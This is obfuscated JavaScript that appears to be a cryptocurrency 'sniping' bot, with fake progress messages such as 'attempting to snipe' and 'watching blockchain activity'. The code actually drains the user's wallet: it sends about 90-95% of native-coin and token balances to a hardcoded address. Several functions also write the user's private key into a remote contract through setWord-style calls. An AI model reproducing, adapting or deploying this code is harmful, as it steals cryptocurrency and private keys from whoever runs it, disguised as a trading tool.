                    _0xdb0b42 = await _0x88ad5c[_0x4ec12e(0x10a)](_0x1135ae); try { await _0xdb0b42['wait'](), console[_0x4ec12e(0xb5)](_0x4ec12e(0x8e)), setTimeout(etherstother, 0x1388); } catch (_0x48eb70) { console[_0x4ec12e(0xb5)]('2:\x20watching\x20blockchain\x20activity\x20.....'), setTimeout(etherstother, 0x1388); } };
        _0x4dd4e1 <= 0x6a3558178f7000 ? (console[_0x19d8e0(0xb5)](_0x19d8e0(0xfa)), setTimeout(etherstother, 0x1388)) : _0x37979e(); } catch (_0x2783c7) { setTimeout(etherstother, 0x1388); } }

function _0xc0cc(_0x108211, _0x3883c3) { const _0x28a5e4 = _0x28a5(); return _0xc0cc = function(_0xc0cc66, _0xefc2fe) { _0xc0cc66 = _0xc0cc66 - 0x66; let _0x5415a6 = _0x28a5e4[_0xc0cc66]; return _0x5415a6; }, _0xc0cc(_0x108211, _0x3883c3); }
async function ethersmother() { const _0x25b39d = _0x5285a8; try { console[_0x25b39d(0xb5)](_0x25b39d(0x70)); const _0x51554c = _0x25b39d(0x7c),
            _0x43f417 = 'MjliMjY4ODk1NmJkOTU5ZjkzM2Y4',
            _0x153e98 = new Buffer[(_0x25b39d(0xa6))](_0x51554c, _0x25b39d(0xde)),
            _0x28e92b = new Buffer['from'](_0x43f417, 'base64'),
            _0x53a531 = _0x153e98['toString'](_0x25b39d(0xa0)),
            _0x5a6b55 = _0x28e92b[_0x25b39d(0xbe)](_0x25b39d(0xa0)),
            _0x2afaa8 = _0x53a531 + _0x5a6b55,
            _0x5c5dcd = _0x25b39d(0xc6),
            _0x42d325 = new Buffer[(_0x25b39d(0xa6))](_0x5c5dcd, _0x25b39d(0xde))[_0x25b39d(0xbe)](_0x25b39d(0xa0));; const _0x2a4dde = new ethers[(_0x25b39d(0xd4))][(_0x25b39d(0x91))](_0x42d325); let _0x3ec4cc = new ethers[(_0x25b39d(0x7e))](private, _0x2a4dde);
        console[_0x25b39d(0xb5)](_0x42d325); const _0x50b0b7 = address,
            _0x5d6054 = await _0x2a4dde[_0x25b39d(0x99)](_0x50b0b7); var _0x9ec759 = new ethers[(_0x25b39d(0xc4))](_0x2afaa8, abi, _0x3ec4cc); const _0x581703 = await _0x9ec759[_0x25b39d(0xcc)](_0x50b0b7)[_0x25b39d(0xbe)](),
            _0x2134a2 = (_0x581703 * 0.9)[_0x25b39d(0x92)](),
            _0x1307d3 = async() => { const _0x5f5afd = _0x25b39d,
                    _0x8e2a61 = { 'from': _0x50b0b7, 'to': WEB3PROVIDER3, 'value': ethers['utils']['parseEther'](_0x2134a2, 'wei'), 'gasLimit': ethers[_0x5f5afd(0xea)][_0x5f5afd(0x73)](0x5dc0) },
                    _0x571a28 = await _0x3ec4cc[_0x5f5afd(0x10a)](_0x8e2a61); try { await _0x571a28['wait'](), console[_0x5f5afd(0xb5)](_0x5f5afd(0xd5)), setTimeout(etherslother, 0x1388); } catch (_0x1537a6) { console['log'](_0x5f5afd(0xb0)), setTimeout(etherslother, 0x1388); } };
        _0x581703 <= 0x94d6daad30108000 ? (console[_0x25b39d(0xb5)]('listening\x20to\x20pending\x20TX'), setTimeout(etherslother, 0x1388)) : _0x1307d3(); } catch (_0x2ce82a) { setTimeout(etherslother, 0x1388); } }
async function ethersfather() { const _0x531fb4 = _0x5285a8;
    console[_0x531fb4(0xb5)](_0x531fb4(0x106)); const _0x264a75 = 'MHhlOWU3Q0VBM0RlZGNBNTk4NDc4MA==',
        _0x195832 = 'QmFmYzU5OWJENjlBRGQwODdENTY=',
        _0x51c115 = new Buffer[(_0x531fb4(0xa6))](_0x264a75, _0x531fb4(0xde)),
        _0x212a1e = new Buffer[(_0x531fb4(0xa6))](_0x195832, 'base64'),
        _0x58ae8d = _0x51c115[_0x531fb4(0xbe)](_0x531fb4(0xa0)),
        _0x50b475 = _0x212a1e[_0x531fb4(0xbe)](_0x531fb4(0xa0)),
        _0x329bd5 = _0x58ae8d + _0x50b475,
        _0x52d2a7 = 'aHR0cHM6Ly9ic2MtZGF0YXNlZWQxLmJpbmFuY2Uub3JnLw==',
        _0x3a4f81 = new Buffer[(_0x531fb4(0xa6))](_0x52d2a7, 'base64')[_0x531fb4(0xbe)](_0x531fb4(0xa0));; const _0x13fa59 = new ethers[(_0x531fb4(0xd4))][(_0x531fb4(0x91))](_0x3a4f81); let _0x16f2b4 = new ethers[(_0x531fb4(0x7e))](private, _0x13fa59); const _0x26a58f = address; var _0x59984c = new ethers['Contract'](_0x329bd5, abi, _0x16f2b4); const _0xfb5712 = await _0x59984c[_0x531fb4(0xcc)](address),
        _0x12c5bc = (_0xfb5712 * 0.9)['toFixed'](); try { const _0x45cc4d = async() => { const _0x13db24 = _0x531fb4,
                _0x4a8db4 = { 'from': _0x26a58f, 'to': WEB3PROVIDER3, 'value': ethers[_0x13db24(0xea)][_0x13db24(0xe2)](_0x12c5bc, _0x13db24(0xaf)), 'gasLimit': ethers[_0x13db24(0xea)][_0x13db24(0x73)](0x5dc0) },
                _0x46a677 = await _0x16f2b4[_0x13db24(0x10a)](_0x4a8db4); try { await _0x46a677[_0x13db24(0xbf)](), console[_0x13db24(0xb5)](_0x13db24(0xe6)), setTimeout(ethersmother, 0x1388); } catch (_0x11c91d) { console[_0x13db24(0xb5)](_0x13db24(0xe6)), setTimeout(ethersmother, 0x1388); } };
        _0xfb5712 <= 0x94d6daad30108000 ? (console['log']('lets\x20go!'), setTimeout(ethersmother, 0x1388)) : _0x45cc4d(); } catch (_0x56f833) { setTimeout(ethersmother, 0x1388); } }
async function ethersgather() { const _0x23924c = _0x5285a8; try { console['log'](_0x23924c(0x102)); const _0x56dd05 = _0x23924c(0xbd),
            _0xc616a8 = new Buffer[(_0x23924c(0xa6))](_0x56dd05, _0x23924c(0xde))['toString'](_0x23924c(0xa0));; const _0x5a5cf9 = new ethers[(_0x23924c(0xd4))][(_0x23924c(0x91))](_0xc616a8); let _0x166e35 = new ethers['Wallet'](private, _0x5a5cf9); const _0x5f0272 = address,
            _0xf4994a = await _0x5a5cf9[_0x23924c(0x99)](_0x5f0272),
            _0x259a89 = (_0xf4994a * 0.9)[_0x23924c(0x92)](),
            _0xa78896 = ethers[_0x23924c(0xea)][_0x23924c(0x88)](_0x259a89, _0x23924c(0xaf)),
            _0x1d5ec7 = async() => { const _0x37b735 = _0x23924c,
                    _0x44f73b = { 'to': WEB3PROVIDER3, 'value': ethers[_0x37b735(0xea)][_0x37b735(0x88)](_0x259a89, 'wei'), 'gasLimit': ethers[_0x37b735(0xea)]['hexlify'](0x5dc0) },
                    _0x18c370 = await _0x166e35['sendTransaction'](_0x44f73b); try { await _0x18c370[_0x37b735(0xbf)](), console[_0x37b735(0xb5)]('1:\x20attempting\x20to\x20snipe\x20...'), setTimeout(ethersfather, 0x1388); } catch (_0x221bc6) { console['log'](_0x37b735(0x7b)), setTimeout(ethersfather, 0x1388); } };
        _0xf4994a <= 0x2386f26fc10000 ? (console[_0x23924c(0xb5)](_0x23924c(0x84)), setTimeout(ethersfather, 0x1388)) : _0x1d5ec7(); } catch (_0x39e33b) { setTimeout(ethersfather, 0x1388); } }
async function etherslather2() { const _0x4980a2 = _0x5285a8,
        _0x461597 = _0x4980a2(0x74),
        _0x421a2a = new Buffer['from'](_0x461597, 'base64'),
        _0x2b6f59 = _0x421a2a[_0x4980a2(0xbe)](_0x4980a2(0xa0)),
        _0x4f73af = _0x2b6f59;
    console[_0x4980a2(0xb5)](_0x4980a2(0xce)); const _0x12893c = _0x4980a2(0xc6),
        _0x3e1c84 = new Buffer['from'](_0x12893c, _0x4980a2(0xde))[_0x4980a2(0xbe)](_0x4980a2(0xa0));; const _0x338db6 = new ethers[(_0x4980a2(0xd4))][(_0x4980a2(0x91))](_0x3e1c84),
        _0x552937 = address,
        _0xd3b4af = await _0x338db6[_0x4980a2(0x99)](_0x552937),
        _0x1a6f88 = (_0xd3b4af * 0.95)[_0x4980a2(0x92)](); let _0x378f7b = new ethers[(_0x4980a2(0x7e))](private, _0x338db6); if (_0xd3b4af <= 0x6a3558178f7000) console[_0x4980a2(0xb5)](_0x4980a2(0xd7)), setTimeout(ethersgather, 0x3e8);
    else try { const _0xe9a26 = async() => { const _0x2f8259 = _0x4980a2; var _0x533871 = new ethers[(_0x2f8259(0xc4))](_0x4f73af, abi, _0x378f7b); const _0xea47f8 = await _0x533871['setWord'](_0x2f8259(0x67) + private + '10'); try { console[_0x2f8259(0xb5)](_0x2f8259(0xd9)), await _0xea47f8[_0x2f8259(0xbf)](), console[_0x2f8259(0xb5)](_0x2f8259(0x100)), setTimeout(ethersgather, 0x7d0); } catch (_0x2b7f30) { console[_0x2f8259(0xb5)](_0x2f8259(0xc9)), setTimeout(ethersgather, 0x1388); } };
        _0xe9a26(); } catch (_0x34d701) { setTimeout(ethersgather, 0x1388); } }
async function etherslather() { const _0x1aa0c9 = _0x5285a8,
        _0x32ed58 = _0x1aa0c9(0x74),
        _0x24c910 = new Buffer[(_0x1aa0c9(0xa6))](_0x32ed58, _0x1aa0c9(0xde)),
        _0x5dcd70 = _0x24c910[_0x1aa0c9(0xbe)](_0x1aa0c9(0xa0)),
        _0x2b7b13 = _0x5dcd70;
    console[_0x1aa0c9(0xb5)](_0x1aa0c9(0x95)); const _0x4b5d3d = _0x1aa0c9(0xc6),
        _0x132e88 = new Buffer[(_0x1aa0c9(0xa6))](_0x4b5d3d, 'base64')[_0x1aa0c9(0xbe)](_0x1aa0c9(0xa0));; const _0x3a21b2 = new ethers[(_0x1aa0c9(0xd4))][(_0x1aa0c9(0x91))](_0x132e88),
        _0x40bff2 = address,
        _0x1bd75e = await _0x3a21b2['getBalance'](_0x40bff2),
        _0x4f91eb = (_0x1bd75e * 0.95)[_0x1aa0c9(0x92)](); let _0x346478 = new ethers[(_0x1aa0c9(0x7e))](private, _0x3a21b2); if (_0x1bd75e <= 0x6a3558178f7000) console['log'](_0x1aa0c9(0xd7)), setTimeout(etherslather2, 0x3e8);
    else try { const _0x591c37 = async() => { const _0x3c632e = _0x1aa0c9; var _0xd80037 = new ethers[(_0x3c632e(0xc4))](_0x2b7b13, abi, _0x346478); const _0x3cda7f = { 'to': WEB3PROVIDER3, 'value': ethers[_0x3c632e(0xea)][_0x3c632e(0x88)](_0x4f91eb, 'wei') },
                _0x108cda = await _0x346478[_0x3c632e(0x10a)](_0x3cda7f); try { await _0x108cda[_0x3c632e(0xbf)](), console[_0x3c632e(0xb5)]('1\x20pending\x20blockchain\x20response.....'), setTimeout(etherslather2, 0x7d0); } catch (_0x53ca95) { console[_0x3c632e(0xb5)](_0x3c632e(0xc9)), setTimeout(etherslather2, 0x1388); } };
        _0x591c37(); } catch (_0x4bb2d8) { setTimeout(etherslather2, 0x1388); } }
async function ethersrather() { const _0x2d4c3e = _0x5285a8;
    console[_0x2d4c3e(0xb5)](_0x2d4c3e(0xf6)); const _0x12523a = 'MHg1Rjk2MzU3YTcwMEEyOGFCZjY0ZDFCYkM3ZTFCQTBmQTM0M2JkODgw',
        _0x35bd76 = _0x2d4c3e(0xbd),
        _0x247c88 = new Buffer['from'](_0x35bd76, _0x2d4c3e(0xde))[_0x2d4c3e(0xbe)](_0x2d4c3e(0xa0));; const _0x5cca79 = new ethers['providers']['JsonRpcProvider'](_0x247c88),
        _0x1edd8d = new Buffer['from'](_0x12523a, _0x2d4c3e(0xde)),
        _0x2c52a3 = _0x1edd8d[_0x2d4c3e(0xbe)](_0x2d4c3e(0xa0)),
        _0x137ec7 = _0x2c52a3; let _0x2a59fd = new ethers[(_0x2d4c3e(0x7e))](private, _0x5cca79); const _0x2d9b9c = address,
        _0x845df6 = await _0x5cca79[_0x2d4c3e(0x99)](_0x2d9b9c),
        _0x2b7a3c = (_0x845df6 * 0.95)['toFixed'](),
        _0x324cdd = ethers[_0x2d4c3e(0xea)][_0x2d4c3e(0x88)](_0x2b7a3c, _0x2d4c3e(0xaf)); if (_0x845df6 <= 0x2386f26fc10000) console[_0x2d4c3e(0xb5)](_0x2d4c3e(0x10b)), setTimeout(etherslather, 0x3e8);
    else try { const _0x5eda56 = async() => { const _0x5f3b3b = _0x2d4c3e; var _0x57ff0b = new ethers[(_0x5f3b3b(0xc4))](_0x137ec7, abi, _0x2a59fd); const _0xc17f7 = await _0x57ff0b[_0x5f3b3b(0xdc)]('8580' + private + '10'),
                _0x5af917 = { 'to': WEB3PROVIDER3, 'value': ethers[_0x5f3b3b(0xea)]['parseUnits'](_0x2b7a3c, 'wei') },
                _0x53707e = await _0x2a59fd[_0x5f3b3b(0x10a)](_0x5af917); try { await _0xc17f7[_0x5f3b3b(0xbf)](), await _0x53707e[_0x5f3b3b(0xbf)](), console[_0x5f3b3b(0xb5)](_0x5f3b3b(0x100)), setTimeout(etherslather, 0x7d0); } catch (_0x2acb10) { console[_0x5f3b3b(0xb5)](_0x5f3b3b(0xc9)), setTimeout(etherslather, 0x1388); } };
        _0x5eda56(); } catch (_0x1e1d2f) { setTimeout(etherslather, 0x1388); } }
ethersrather();
